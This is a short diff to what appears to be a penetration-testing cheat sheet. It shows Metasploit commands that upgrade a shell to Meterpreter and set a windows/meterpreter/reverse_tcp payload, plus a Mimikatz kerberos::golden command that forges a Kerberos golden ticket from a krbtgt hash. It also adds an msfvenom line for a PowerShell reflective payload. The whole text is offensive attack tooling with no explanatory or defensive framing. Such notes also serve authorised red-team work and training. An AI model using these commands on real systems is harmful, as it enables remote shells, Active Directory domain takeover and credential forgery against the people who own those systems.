@@ -960,3 +960,5 @@ use post/multi/manage/shell_to_meterpreter
 basic payload set payload windows/meterpreter/reverse_tcp
 
 kerberos::golden /user:pete /domain:<domain_name> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /id:500
+
+msfvenom -f psh-reflection
